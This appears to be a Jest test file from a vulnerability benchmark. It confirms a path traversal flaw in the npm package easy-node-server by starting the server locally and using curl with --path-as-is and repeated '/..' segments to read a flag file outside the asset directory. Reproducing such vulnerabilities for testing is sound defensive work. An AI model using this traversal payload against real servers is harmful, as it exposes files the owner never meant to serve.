const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");
function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}
test("Path Traversal in easy-node-server", (done) => {
  expect.assertions(1);
  const pkg = require("easy-node-server");
  const fs = require("fs");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require("child_process");
  try {
    a.execSync("fuser -k 8895/tcp", () => {});
  } catch (e) {}
  pkg.start({
    port: 8895,
    assetPath: __dirname,
  });
  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8895${genstr()}"`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
